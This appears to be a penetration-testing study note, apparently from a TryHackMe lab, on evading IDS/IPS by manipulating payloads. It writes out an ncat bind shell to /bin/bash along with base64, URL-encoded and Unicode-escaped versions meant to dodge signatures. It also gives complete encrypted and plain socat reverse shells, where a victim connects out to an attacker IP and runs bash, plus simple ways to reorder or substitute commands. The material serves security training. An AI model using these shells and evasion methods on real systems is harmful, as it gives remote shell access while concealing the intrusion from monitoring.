# Evasion via Payload Manipulation

Payload manipulation techniques help evade network security solutions like IDS/IPS by altering how malicious data appears or is transmitted. Common methods include:

- Obfuscating and encoding the payload
- Encrypting the communication channel
- Modifying the shellcode

---

## 1. Obfuscate and Encode the Payload

IDS rules are often specific, so minor changes can help avoid detection. Techniques include adding extra bytes, obfuscating data, or encrypting communication.

### Example Command

```bash
ncat -lvnp 1234 -e /bin/bash
```
This command listens on TCP port 1234 and connects incoming connections to a Bash shell.

#### Common Transformations

- **Base64 Encoding**

    Encode your payload using `base64`:

    ```bash
    pentester@TryHackMe$ cat input.txt
    ncat -lvnp 1234 -e /bin/bash
    $ base64 input.txt
    bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
    ```

    The command is now encoded as:  
    `bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==`

- **URL Encoding**

    URL encoding replaces certain characters with `%HH` (hexadecimal ASCII). Use `urlencode` or online tools:

    ```bash
    pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
    ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
    ```

    The command becomes:  
    `ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash`

- **Escaped Unicode**

    Some systems accept Unicode-escaped input. For example, using CyberChef's "Escape Unicode Characters" recipe:

    ```
    \u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068
    ```

    This is a drastic transformation that may evade detection if the target system interprets it correctly.

---

## 2. Encrypt the Communication Channel

IDS/IPS cannot inspect encrypted data. Attackers can use encryption to hide payloads.

### Example: Encrypted Reverse Shell with socat

#### Step 1: Create the Key

```bash
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
```

- `thm-reverse.key`: Private key
- `thm-reverse.crt`: Certificate
- `thm-reverse.pem`: Combined PEM file

#### Step 2: Listen with socat

```bash
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
```

#### Step 3: Connect from Victim

```bash
socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
```

**Result:** All traffic is encrypted. IDS/IPS cannot see commands like `cat /etc/passwd`.

#### Comparison: Unencrypted socat

- **Attacker:** `socat -d -d TCP-LISTEN:4443,fork STDOUT`
- **Victim:** `socat TCP:10.20.30.129:4443 EXEC:/bin/bash`

Traffic is in cleartext and easily inspected.

---

## 3. Modify the Data

Simple changes can evade signature-based detection:

- Change the order of flags:  
    `ncat -lvnp 1234 -e /bin/bash` → `ncat -e /bin/bash -lvnp 1234`
- Add extra whitespace:  
    `ncat  -lvnp 1234 -e /bin/bash`
- Use alternative commands:  
    Replace `ncat` with `nc` or `socat`
- Use different encodings if supported by the target

---

**Note:** The effectiveness of these techniques depends on the target system and the specificity of IDS/IPS rules.
